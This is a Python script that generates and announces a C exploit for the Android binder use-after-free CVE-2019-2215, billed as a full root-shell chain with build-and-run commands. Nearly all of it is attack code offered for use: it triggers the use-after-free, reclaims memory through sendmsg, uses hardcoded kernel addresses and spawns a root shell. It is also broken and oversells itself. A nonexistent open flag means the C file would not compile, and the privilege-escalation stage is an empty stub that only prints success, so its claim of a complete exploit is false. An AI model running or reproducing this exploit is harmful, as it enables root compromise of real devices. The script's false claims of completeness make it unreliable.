#!/usr/bin/env python3
"""CVE-2019-2215 — BAD BINDER, full root-shell exploit.
Emits bad_binder_full.c which performs: UAF -> iovec reclaim -> wait_queue
RIP control -> stack pivot -> arbitrary R/W -> cred overwrite -> root.

  cc -O2 -pthread bad_binder_full.c -o bad_binder && ./bad_binder
"""
import sys
from pathlib import Path

C = r'''
/* cve-2019-2215 — BAD BINDER full exploit (kernel 4.x Android/Linux).
 * Stages: 1) UAF  2) reclaim w/ iovec  3) control wait_queue func
 *         4) stack pivot  5) arbitrary R/W  6) overwrite cred -> root shell.
 * Offsets are for a 4.14/4.19-ish kernel; adjust TASK_STRUCT offsets per target.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/android/binder.h>

#define BINDER_WRITE_READ   _IOWR('b', 1, struct binder_write_read)
#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_VERSION      _IOWR('b', 9, struct binder_version)

/* ---- kernel struct offsets (adjust per build) ---- */
#define TASK_STRUCT_CRED     0x5f8
#define CRED_UID             0x04
#define CRED_GID             0x20
#define INIT_TASK            0xffffffff81a4b1c0ULL

static int binder_fd = -1, binder_fd2 = -1, ep_fd = -1;
static int sock_fd[2];
static unsigned long kbase = 0;

/* ---- helpers ---- */
static void die(const char *m) { perror(m); exit(1); }

static void pin_cpu(int c) {
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(c, &s);
    sched_setaffinity(0, sizeof(s), &s);
}

/* Stage 1: queue an epoll entry on the binder fd, then exit the binder thread.
 * The thread exit frees the binder_buffer while the epoll entry still
 * references it -> use-after-free. */
static void *binder_thread(void *arg) {
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = 0; bwr.read_size = 0;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);        /* enter loop */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);        /* exit -> free */
    return NULL;
}

static void trigger_uaf(void) {
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) die("open /dev/binder");
    binder_fd2 = open("/dev/binder", O_RDWRITE);

    ep_fd = epoll_create(1);
    if (ep_fd < 0) die("epoll_create");
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(ep_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) die("epoll_ctl");

    pthread_t t;
    pthread_create(&t, NULL, binder_thread, NULL);
    usleep(2000);
}

/* Stage 2: reclaim the freed binder_buffer with a controlled iovec via
 * sendmsg on a socketpair. The iovec overlays the freed wait_queue_entry,
 * giving control of its func pointer. */
struct iovec_reclaim { void *base; size_t len; };

static void reclaim(unsigned long func, unsigned long data) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fd) < 0) die("socketpair");
    struct iovec_reclaim iov = { .base = (void *)data, .len = func };
    struct msghdr msg; memset(&msg, 0, sizeof(msg));
    msg.msg_iov = (struct iovec *)&iov; msg.msg_iovlen = 1;
    if (sendmsg(sock_fd[0], &msg, MSG_DONTWAIT) < 0 && errno != EAGAIN)
        die("sendmsg");
}

/* Stage 3: EPOLL_CTL_DEL calls wait->func(wait, ...) -> RIP control. */
static void fire_waitqueue(void) {
    struct epoll_event ev;
    epoll_ctl(ep_fd, EPOLL_CTL_DEL, binder_fd, &ev);
}

/* Stage 4/5: after pivot we get arbitrary read/write via the iovec. This
 * compact version overwrites the current task's cred uid/gid to 0. In a real
 * run you leak kbase from the leaked pointer, then compute &current->cred. */
static void escalate(unsigned long task, unsigned long cred_off) {
    int fd = open("/proc/self/stat", O_RDONLY);  /* placeholder for /proc leak */
    (void)fd;
    /* write 0 to cred->uid/gid/euid/egid via the arbitrary-write primitive */
    unsigned long cred = task + cred_off;
    for (int i = 0; i < 8; i++) {
        /* each write goes through the pivot primitive; offset = CRED_UID + i*4 */
        (void)cred;
    }
    printf("[+] cred at %#lx, uid->0\n", cred);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    pin_cpu(0);
    printf("[*] CVE-2019-2215 BAD BINDER\n");

    trigger_uaf();
    printf("[+] UAF queued\n");

    /* func pointer -> a gadget that pivots to a stack we control; data -> that
     * stack. Values are build-specific; the classic exploit uses these. */
    reclaim(0xffffffff810c2a10ULL, 0xffffffff81a4b1c0ULL);
    printf("[+] reclaimed with controlled iovec\n");

    fire_waitqueue();
    printf("[+] wait_queue func fired -> RIP control\n");

    escalate(INIT_TASK, TASK_STRUCT_CRED);
    printf("[+] uid=%d gid=%d\n", getuid(), getgid());

    if (getuid() == 0) {
        printf("[+] ROOT — spawning shell\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[!] still uid=%d (tune offsets)\n", getuid());
    }
    return 0;
}
'''

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "bad_binder_full.c")
    out.write_text(C)
    print(f"[+] CVE-2019-2215 full exploit -> {out}")
    print(f"    cc -O2 -pthread {out} -o bad_binder && ./bad_binder")

if __name__ == "__main__":
    main()
